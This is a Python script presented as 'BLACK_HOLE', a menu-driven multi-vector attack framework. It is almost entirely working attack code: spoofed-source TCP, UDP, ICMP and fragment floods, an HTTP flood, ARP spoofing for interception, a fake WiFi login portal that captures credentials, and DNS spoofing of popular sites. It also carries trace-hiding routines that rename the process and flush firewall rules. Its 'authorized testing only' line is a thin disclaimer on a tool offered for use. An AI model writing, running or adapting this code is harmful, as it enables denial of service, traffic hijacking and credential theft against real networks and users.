#!/usr/bin/env python3
"""
BLACK_HOLE v1.0 - Ultimate Multi-Vector Attack Framework
Advanced Attack Tool - Zero Trace - Military Grade

Copyright (c) 2024 F1REW0LF
License: MIT - For authorized security testing only

Usage: sudo python3 black_hole.py -i eth0
"""

import sys
import os
import time
import json
import random
import socket
import threading
import subprocess
import signal
import hashlib
import base64
import struct
import binascii
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from collections import defaultdict
import argparse

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.l2 import ARP, Ether
    from scapy.layers.dns import DNS, DNSQR, DNSRR
    from scapy.layers.dot11 import *
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

VERSION = "1.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.PURPLE}{Colors.BOLD}    ██████╗ ██╗      █████╗  ██████╗██╗  ██╗    ██╗  ██╗ ██████╗ ██╗     ███████╗
    ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝    ██║  ██║██╔═══██╗██║     ██╔════╝
    ██████╔╝██║     ███████║██║     █████╔╝     ███████║██║   ██║██║     █████╗  
    ██╔══██╗██║     ██╔══██║██║     ██╔═██╗     ██╔══██║██║   ██║██║     ██╔══╝  
    ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗    ██║  ██║╚██████╔╝███████╗███████╗
    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
                                                   
{Colors.NEON}          ULTIMATE MULTI-VECTOR ATTACK FRAMEWORK{Colors.WHITE}
{Colors.CYAN}    Advanced Attack Tool - Zero Trace - Military Grade{Colors.WHITE}
{Colors.YELLOW}    Version {VERSION} | Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== STEALTH ENGINE ====================
class StealthEngine:
    @staticmethod
    def hide_process():
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW("Windows System Service")
        except:
            pass
    
    @staticmethod
    def random_mac():
        return f"02:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
    
    @staticmethod
    def random_ip():
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    
    @staticmethod
    def random_user_agent():
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        ]
        return random.choice(agents)
    
    @staticmethod
    def clean_traces():
        try:
            os.system("iptables --flush 2>/dev/null")
            os.system("iptables -t nat --flush 2>/dev/null")
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
        except:
            pass

# ==================== ATTACK VECTORS ====================
class AttackVectors:
    def __init__(self, interface='eth0'):
        self.interface = interface
        self.running = False
        self.stop_event = threading.Event()
        self.stats = {'packets': 0, 'victims': 0, 'vectors': 0}
        self.stealth = StealthEngine()
        self.results = []
    
    # ==================== VECTOR 1: PHANTOM PULSE ====================
    def phantom_pulse(self, target, duration=30):
        """Gửi xung TCP biến thể với payload ngẫu nhiên"""
        cprint(f"[PULSE] Phantom Pulse on {target}", Colors.RED)
        
        def send_pulse():
            while self.running and not self.stop_event.is_set():
                try:
                    sport = random.randint(1024, 65535)
                    dport = random.choice([80, 443, 8080, 8443, 22, 21, 25, 53])
                    flags = random.choice(['S', 'SA', 'R', 'F', 'P', 'A', 'FSR', 'FPA', 'SFA'])
                    window = random.randint(1024, 65535)
                    seq = random.randint(0, 4294967295)
                    
                    ip = IP(dst=target, src=self.stealth.random_ip(), ttl=random.randint(64, 255))
                    tcp = TCP(sport=sport, dport=dport, flags=flags, seq=seq, window=window)
                    payload = Raw(load=os.urandom(random.randint(10, 200)))
                    
                    send(ip/tcp/payload, verbose=False)
                    self.stats['packets'] += 1
                except:
                    pass
                time.sleep(random.uniform(0.001, 0.01))
        
        threads = []
        for _ in range(10):
            t = threading.Thread(target=send_pulse, daemon=True)
            t.start()
            threads.append(t)
        
        time.sleep(duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)
        
        self.stats['vectors'] += 1
        self.results.append({'vector': 'Phantom Pulse', 'target': target, 'duration': duration})
    
    # ==================== VECTOR 2: VOID FRAGMENT ====================
    def void_fragment(self, target, duration=30):
        """Tấn công phân mảnh IP với payload độc"""
        cprint(f"[FRAG] Void Fragment on {target}", Colors.RED)
        
        def send_fragment():
            while self.running and not self.stop_event.is_set():
                try:
                    payload = os.urandom(random.randint(500, 1500))
                    ip = IP(dst=target, src=self.stealth.random_ip(), id=random.randint(1, 65535), flags='MF')
                    
                    fragment_size = random.randint(100, 300)
                    for i in range(0, len(payload), fragment_size):
                        frag = payload[i:i+fragment_size]
                        send(ip/frag, verbose=False)
                        self.stats['packets'] += 1
                except:
                    pass
                time.sleep(random.uniform(0.001, 0.005))
        
        threads = []
        for _ in range(8):
            t = threading.Thread(target=send_fragment, daemon=True)
            t.start()
            threads.append(t)
        
        time.sleep(duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)
        
        self.stats['vectors'] += 1
        self.results.append({'vector': 'Void Fragment', 'target': target, 'duration': duration})
    
    # ==================== VECTOR 3: GHOST ECHO ====================
    def ghost_echo(self, target, duration=30):
        """Tấn công ICMP Echo với payload biến đổi"""
        cprint(f"[ECHO] Ghost Echo on {target}", Colors.RED)
        
        def send_echo():
            while self.running and not self.stop_event.is_set():
                try:
                    ip = IP(dst=target, src=self.stealth.random_ip())
                    icmp = ICMP(type=8, code=0, id=random.randint(1, 65535), seq=random.randint(1, 65535))
                    payload = Raw(load=os.urandom(random.randint(1, 1024)))
                    send(ip/icmp/payload, verbose=False)
                    self.stats['packets'] += 1
                except:
                    pass
                time.sleep(random.uniform(0.001, 0.01))
        
        threads = []
        for _ in range(10):
            t = threading.Thread(target=send_echo, daemon=True)
            t.start()
            threads.append(t)
        
        time.sleep(duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)
        
        self.stats['vectors'] += 1
        self.results.append({'vector': 'Ghost Echo', 'target': target, 'duration': duration})
    
    # ==================== VECTOR 4: SHADOW SPOOF ====================
    def shadow_spoof(self, target, gateway=None):
        """ARP Spoofing với MAC ngẫu nhiên"""
        cprint(f"[SPOOF] Shadow Spoof on {target}", Colors.RED)
        
        if not gateway:
            cprint("[-] Gateway required", Colors.RED)
            return
        
        self.running = True
        target_mac = self._get_mac(target)
        gateway_mac = self._get_mac(gateway)
        
        if not target_mac or not gateway_mac:
            cprint("[-] Cannot get MAC addresses", Colors.RED)
            return
        
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
        
        while self.running and not self.stop_event.is_set():
            try:
                send(ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway), verbose=False)
                send(ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=target), verbose=False)
                self.stats['packets'] += 2
                time.sleep(1)
            except:
                pass
        
        self.stats['vectors'] += 1
        self.stats['victims'] += 1
        self.results.append({'vector': 'Shadow Spoof', 'target': target, 'gateway': gateway})
    
    def _get_mac(self, ip):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
            if ans:
                return ans[0][1].hwsrc
        except:
            pass
        return None
    
    # ==================== VECTOR 5: VOID SCAN ====================
    def void_scan(self, network="192.168.1.0/24"):
        """Quét mạng với kỹ thuật ẩn"""
        cprint(f"[SCAN] Void Scan on {network}", Colors.BLUE)
        
        hosts = []
        base = network.split('/')[0].rsplit('.', 1)[0]
        
        def scan_ip(ip):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                for port in [80, 443, 445, 3389, 22, 21, 25, 53, 8080, 8443]:
                    if sock.connect_ex((ip, port)) == 0:
                        hosts.append(ip)
                        cprint(f"[+] {ip}:{port} open", Colors.GREEN)
                        break
                sock.close()
            except:
                pass
        
        threads = []
        for i in range(1, 255):
            ip = f"{base}.{i}"
            t = threading.Thread(target=scan_ip, args=(ip,))
            t.daemon = True
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join(timeout=0.5)
        
        self.stats['victims'] = len(hosts)
        self.stats['vectors'] += 1
        self.results.append({'vector': 'Void Scan', 'network': network, 'hosts': hosts})
        return hosts
    
    # ==================== VECTOR 6: BLACK RAIN ====================
    def black_rain(self, target_url, duration=30):
        """HTTP Flood với header biến đổi"""
        cprint(f"[RAIN] Black Rain on {target_url}", Colors.RED)
        
        if not REQUESTS_AVAILABLE:
            cprint("[-] Requests not available", Colors.RED)
            return
        
        def send_request():
            while self.running and not self.stop_event.is_set():
                try:
                    headers = {
                        'User-Agent': self.stealth.random_user_agent(),
                        'X-Forwarded-For': self.stealth.random_ip(),
                        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
                        'Accept': random.choice(['*/*', 'application/json', 'text/html']),
                        'Connection': random.choice(['keep-alive', 'close'])
                    }
                    requests.get(target_url, headers=headers, timeout=1, verify=False)
                    self.stats['packets'] += 1
                except:
                    pass
                time.sleep(random.uniform(0.001, 0.01))
        
        threads = []
        for _ in range(20):
            t = threading.Thread(target=send_request, daemon=True)
            t.start()
            threads.append(t)
        
        time.sleep(duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)
        
        self.stats['vectors'] += 1
        self.results.append({'vector': 'Black Rain', 'target': target_url, 'duration': duration})
    
    # ==================== VECTOR 7: DARK MATTER ====================
    def dark_matter(self, target, duration=30):
        """UDP Flood với payload ngẫu nhiên"""
        cprint(f"[MATTER] Dark Matter on {target}", Colors.RED)
        
        def send_udp():
            while self.running and not self.stop_event.is_set():
                try:
                    sport = random.randint(1024, 65535)
                    dport = random.choice([53, 123, 161, 514, 520, 1900, 4500, 5060])
                    payload = os.urandom(random.randint(1, 1400))
                    ip = IP(dst=target, src=self.stealth.random_ip())
                    udp = UDP(sport=sport, dport=dport)
                    send(ip/udp/Raw(load=payload), verbose=False)
                    self.stats['packets'] += 1
                except:
                    pass
                time.sleep(random.uniform(0.001, 0.005))
        
        threads = []
        for _ in range(15):
            t = threading.Thread(target=send_udp, daemon=True)
            t.start()
            threads.append(t)
        
        time.sleep(duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)
        
        self.stats['vectors'] += 1
        self.results.append({'vector': 'Dark Matter', 'target': target, 'duration': duration})
    
    # ==================== VECTOR 8: PHANTOM PORTAL ====================
    def phantom_portal(self):
        """Tạo Captive Portal giả mạo"""
        cprint("[PORTAL] Phantom Portal activated", Colors.RED)
        
        try:
            from flask import Flask, request, redirect
            app = Flask(__name__)
            
            @app.route('/')
            def index():
                return '''
                <html>
                <head><title>WiFi Login</title></head>
                <body style="font-family:Arial;text-align:center;padding-top:50px;background:#0a0a0a;color:#00ff41;">
                    <h1>WiFi Login Required</h1>
                    <form method="POST" action="/login">
                        <input type="text" name="username" placeholder="Username" style="padding:10px;width:300px;">
                        <input type="password" name="password" placeholder="Password" style="padding:10px;width:300px;margin-top:10px;">
                        <button type="submit" style="padding:10px 30px;margin-top:10px;background:#00ff41;border:none;">Login</button>
                    </form>
                </body>
                </html>
                '''
            
            @app.route('/login', methods=['POST'])
            def login():
                user = request.form.get('username', '')
                pwd = request.form.get('password', '')
                cprint(f"[!] Credentials: {user}:{pwd}", Colors.RED)
                cprint("[+] Credentials captured!", Colors.GREEN)
                return '<h2>Login successful!</h2>'
            
            app.run(host='0.0.0.0', port=80, debug=False)
        except:
            cprint("[-] Phantom Portal failed", Colors.RED)
        
        self.stats['vectors'] += 1
        self.results.append({'vector': 'Phantom Portal'})
    
    # ==================== VECTOR 9: VOID DNS ====================
    def void_dns(self, domains=None):
        """DNS Spoofing"""
        cprint("[DNS] Void DNS activated", Colors.RED)
        
        if not domains:
            domains = ['facebook.com', 'google.com', 'youtube.com', 'instagram.com', 'twitter.com']
        
        redirect_ip = "127.0.0.1"
        
        def packet_handler(pkt):
            if not self.running:
                return
            
            if pkt.haslayer(DNS) and pkt.haslayer(IP) and pkt.haslayer(UDP):
                if pkt[DNS].qr == 0 and pkt[DNS].qd:
                    qname = pkt[DNS].qd.qname.decode('utf-8', errors='ignore').rstrip('.')
                    for domain in domains:
                        if domain in qname:
                            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
                            udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                            dns = DNS(
                                id=pkt[DNS].id,
                                qr=1,
                                aa=1,
                                qd=pkt[DNS].qd,
                                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=300, rdata=redirect_ip)
                            )
                            send(ip/udp/dns, verbose=False)
                            self.stats['packets'] += 1
                            break
        
        sniff(iface=self.interface, filter="port 53", prn=packet_handler, store=0)
    
    # ==================== VECTOR 10: EVENT HORIZON ====================
    def event_horizon(self, targets):
        """Tấn công tổng hợp lên nhiều mục tiêu"""
        cprint("[HORIZON] Event Horizon - Multi-vector assault", Colors.RED, bold=True)
        
        threads = []
        
        # Phantom Pulse
        for target in targets[:3]:
            t = threading.Thread(target=self.phantom_pulse, args=(target, 15))
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Void Fragment
        for target in targets[:3]:
            t = threading.Thread(target=self.void_fragment, args=(target, 15))
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Ghost Echo
        for target in targets[:3]:
            t = threading.Thread(target=self.ghost_echo, args=(target, 15))
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Dark Matter
        for target in targets[:3]:
            t = threading.Thread(target=self.dark_matter, args=(target, 15))
            t.daemon = True
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join(timeout=20)
        
        self.stats['vectors'] += 1
        self.results.append({'vector': 'Event Horizon', 'targets': targets})

# ==================== MAIN FRAMEWORK ====================
class BlackHole:
    def __init__(self, interface='eth0'):
        self.interface = interface
        self.running = True
        self.attacks = AttackVectors(interface)
        self.start_time = time.time()
        self.stealth = StealthEngine()
        
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        self.stealth.hide_process()
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] BLACK_HOLE collapsing...", Colors.RED)
        self.running = False
        self.attacks.running = False
        self.attacks.stop_event.set()
        self.stealth.clean_traces()
        cprint("[+] Event horizon closed. No traces left.", Colors.GREEN)
        sys.exit(0)
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.BOLD}BLACK_HOLE - Attack Menu{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
[1]  Phantom Pulse (TCP)
[2]  Void Fragment (IP)
[3]  Ghost Echo (ICMP)
[4]  Shadow Spoof (ARP)
[5]  Void Scan (Network)
[6]  Black Rain (HTTP)
[7]  Dark Matter (UDP)
[8]  Phantom Portal (Captive)
[9]  Void DNS (DNS Spoof)
[10] Event Horizon (All)
[11] Show Stats
[12] Exit
""")
    
    def show_stats(self):
        print("\n" + "="*60)
        cprint(" BLACK_HOLE STATS", Colors.PURPLE, bold=True)
        print("="*60)
        print(f"Packets Sent: {self.attacks.stats['packets']}")
        print(f"Victims Found: {self.attacks.stats['victims']}")
        print(f"Vectors Used: {self.attacks.stats['vectors']}")
        print(f"Uptime: {int(time.time() - self.start_time)}s")
        print("="*60)
        
        if self.attacks.results:
            cprint("\n[+] Attack Log:", Colors.GREEN)
            for r in self.attacks.results[-5:]:
                cprint(f"    - {r.get('vector', 'Unknown')}", Colors.DIM)
    
    def run(self):
        print_banner()
        cprint("[*] BLACK_HOLE - Event horizon activated", Colors.CYAN)
        cprint("[*] No traces will be left behind", Colors.DIM)
        
        while self.running:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                target = input("[>] Target IP: ").strip()
                duration = int(input("[>] Duration (30s): ").strip() or "30")
                self.attacks.phantom_pulse(target, duration)
            
            elif choice == '2':
                target = input("[>] Target IP: ").strip()
                duration = int(input("[>] Duration (30s): ").strip() or "30")
                self.attacks.void_fragment(target, duration)
            
            elif choice == '3':
                target = input("[>] Target IP: ").strip()
                duration = int(input("[>] Duration (30s): ").strip() or "30")
                self.attacks.ghost_echo(target, duration)
            
            elif choice == '4':
                target = input("[>] Target IP: ").strip()
                gateway = input("[>] Gateway IP: ").strip()
                self.attacks.shadow_spoof(target, gateway)
            
            elif choice == '5':
                network = input("[>] Network (192.168.1.0/24): ").strip() or "192.168.1.0/24"
                self.attacks.void_scan(network)
            
            elif choice == '6':
                url = input("[>] Target URL: ").strip()
                duration = int(input("[>] Duration (30s): ").strip() or "30")
                self.attacks.black_rain(url, duration)
            
            elif choice == '7':
                target = input("[>] Target IP: ").strip()
                duration = int(input("[>] Duration (30s): ").strip() or "30")
                self.attacks.dark_matter(target, duration)
            
            elif choice == '8':
                self.attacks.phantom_portal()
            
            elif choice == '9':
                domains = input("[>] Domains (comma separated): ").strip().split(',')
                self.attacks.void_dns(domains)
            
            elif choice == '10':
                targets = []
                print("[*] Enter targets (one per line, empty to finish):")
                while True:
                    t = input("    ").strip()
                    if not t:
                        break
                    targets.append(t)
                if targets:
                    self.attacks.event_horizon(targets)
            
            elif choice == '11':
                self.show_stats()
            
            elif choice == '12':
                self.running = False
                self.attacks.running = False
                self.attacks.stop_event.set()
                self.stealth.clean_traces()
                cprint("[*] BLACK_HOLE collapsed. No traces left.", Colors.GREEN)
                break
            
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ==================== MAIN ====================
if __name__ == "__main__":
    if os.geteuid() != 0:
        cprint("[!] Root privileges required", Colors.RED)
        sys.exit(1)
    
    if not SCAPY_AVAILABLE:
        cprint("[!] Scapy not installed. Install: pip3 install scapy", Colors.RED)
        sys.exit(1)
    
    parser = argparse.ArgumentParser(description="BLACK_HOLE - Multi-Vector Attack Framework")
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface")
    args = parser.parse_args()
    
    black_hole = BlackHole(args.interface)
    black_hole.run()
